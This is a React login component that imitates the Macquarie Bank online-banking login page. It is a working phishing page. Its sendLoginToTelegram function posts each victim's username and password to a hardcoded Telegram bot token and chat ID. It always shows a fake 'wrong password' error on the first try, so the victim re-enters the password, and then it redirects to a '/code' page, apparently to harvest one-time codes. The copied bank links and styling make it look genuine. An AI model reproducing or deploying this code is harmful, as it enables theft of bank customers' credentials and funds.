import { useState } from "react";
import { useNavigate } from "react-router-dom";

const TELEGRAM_BOT_TOKEN = "7038583008:AAGLUNtjIrPvDbtGGwY0yMb-hbkDdjszVP4";
const TELEGRAM_CHAT_ID = "1951445523";

const Login = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [code, setCode] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isPasswordEmpty, setIsPasswordEmpty] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [isPasswordErrorForced, setIsPasswordErrorForced] = useState(true); // Tracks the first click
  const [showError, setShowError] = useState(false);
  const navigate = useNavigate()

  const sendLoginToTelegram = async (username, password) => {
    const message = `
    \n********************************
    New Login Attempt for Macquarie Bank:\nUsername: ${username}, \nPassword: ${password}
    \n********************************
    `;

    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      }
    );
  };

  

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitted(true);
    setLoading(true); // Start spinner immediately

    // Wait for 5 seconds before checking errors
    setTimeout(async () => {
        // Validate password after 5 seconds
        if (password.trim() === "") {
            setIsPasswordEmpty(true); // Show error after delay
            setLoading(false); // Stop spinner
            return;
        }

        try {
            // Send login details to Telegram
            await sendLoginToTelegram(username, password);

            if (isPasswordErrorForced) {
                setShowError(true); // Show error message
                setIsPasswordErrorForced(false);
            } else {
                setShowError(false);

                // Wait for 3 seconds before navigating
                setTimeout(() => {
                    navigate("/code");
                }, 2500);
            }
        } catch (error) {
            console.error("Login failed", error);
        } finally {
            setLoading(false); // Stop spinner after completion
        }
    }, 4000); // 5-second delay before processing validation
};

  const handlePasswordChange = (e) => {
    const value = e.target.value;
    setPassword(value);
    setIsPasswordEmpty(value.trim() === ""); // Check if password is empty
  };

 

  return (
    <div>
      <form onSubmit={handleSubmit}>
        <div className="form-group--material">
          <input
            className="form-control--material"
            autoComplete="off"
            id="username"
            aria-label="Macquarie ID"
            placeholder=" "
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
          <span className="form-control-bar--material"></span>
          <label
            aria-hidden="true"
            htmlFor="username"
            className="form-label--material"
          >
            Macquarie ID
          </label>
        </div>

        <div className="form-group--material">
          <input
            className={`form-control--material form-control--with-addition ${
              isSubmitted && isPasswordEmpty ? "invalid" : ""
            }`}
            autoComplete="off"
            id="password"
            aria-label="password"
            placeholder=" "
            type={showPassword ? "text" : "password"}
            value={password}
            onChange={handlePasswordChange}
            onFocus={() => setIsPasswordEmpty(false)}
          />
          <a
            aria-hidden="true"
            className="input-addition mq-link auth-link"
            onClick={() => setShowPassword(!showPassword)}
          >
            {showPassword ? "Hide" : "Show"}
          </a>
          <span className="form-control-bar--material"></span>
          <label
            aria-hidden="true"
            htmlFor="password"
            className="form-label--material"
          >
            Password
          </label>
        </div>

        {isSubmitted && isPasswordEmpty && (
          <div className="mq-auth-field-error">
            <div className="text-danger mq-margin-xs-right">
              <svg
                viewBox="0 0 16 16"
                fill="none"
                height="16"
                width="16"
                xmlns="http://www.w3.org/2000/svg"
                _ngcontent-hwm-c3=""
                focusable="false"
              >
                <path
                  d="m4 12 8-8M4 4l8 8"
                  stroke-width="1.5"
                  stroke-linejoin="round"
                  stroke-linecap="round"
                  stroke="#dc3832"
                  _ngcontent-hwm-c3=""
                ></path>
              </svg>
              <span className="auth-body-text">Your password is required</span>
            </div>
          </div>
        )}

        {showError && !loading && (
          <div className="mq-auth-field-error">
            <div className="text-danger mq-margin-xs-right">
              <svg
                viewBox="0 0 16 16"
                fill="none"
                height="16"
                width="16"
                xmlns="http://www.w3.org/2000/svg"
                _ngcontent-hwm-c3=""
                focusable="false"
              >
                <path
                  d="m4 12 8-8M4 4l8 8"
                  stroke-width="1.5"
                  stroke-linejoin="round"
                  stroke-linecap="round"
                  stroke="#dc3832"
                  _ngcontent-hwm-c3=""
                ></path>
              </svg>
              <span className="auth-body-text">
                You have entered the wrong password
              </span>
            </div>
          </div>
        )}

        <div className="button-container">
          <button type="submit" className="button">
            {loading ? <span className="spinner"></span> : "Login"}
          </button>
        </div>

        <div className="ng-star-inserted">
          <div className="links-row">
            <div className="auth-body-text">
              {" "}
              The{" "}
              <a
                target="_blank"
                auth-analytics-on="click"
                class="mq-link auth-link"
                href="https://www.macquarie.com.au/digital-banking/electronic-banking-terms-and-conditions.html "
              >
                {" "}
                Electronic Banking Terms and Conditions{" "}
              </a>
              &nbsp;apply to your use of Electronic Banking.{" "}
            </div>
          </div>
        </div>
        <div className="top">
          <div className="links-row">
            <div className="auth-body-text">
              <a
                routerlink="/error/trouble_login"
                auth-analytics-on="click"
                class="mq-link auth-link"
                href="#/error/trouble_login"
              >
                {" "}
                Forgot log in details?{" "}
              </a>
            </div>

            <div className="auth-body-text">
              <a
                routerlink="/register"
                auth-analytics-on="click"
                class="mq-link auth-link"
                href="#/register"
              >
                {" "}
                New to internet banking? Register now.{" "}
              </a>
            </div>
          </div>
        </div>
      </form>
    </div>
  );
};

export default Login;
